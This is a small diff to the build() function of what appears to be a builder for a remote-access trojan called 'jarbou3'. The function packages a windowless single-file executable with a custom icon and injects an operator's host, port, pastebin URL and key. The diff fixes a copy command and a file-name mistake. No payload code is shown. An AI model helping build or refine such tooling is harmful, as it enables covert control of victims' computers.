@@ -123,7 +123,7 @@ def build():
                 'wine pyinstaller --noconfirm --onefile --windowed --upx-dir upx --icon  "' + icon + '"  "jarbou3.py"')
 
         if platform.system() == "Windows":
-            os.system('powershell -c cd dist; mv jarbou3.exe ..')
+            os.system('powershell -c cd dist; cp jarbou3.exe ..')
             os.remove('jarbou3.py')
         else:
             os.system("cd dist && mv jarbou3.exe ..")
@@ -140,7 +140,7 @@ def build():
         ask = input('is  those your host and port(y/n):')
         if ask == 'y':
             replace_string('jarbou3-pastebin.py', '$pastebin', URL)
-            replace_string('jarbou3.py', '$key', key)
+            replace_string('jarbou3-pastebin.py', '$key', key)
             icon = ''
             while isfile(icon) == False:
                 icon = input('entre your icon path:')
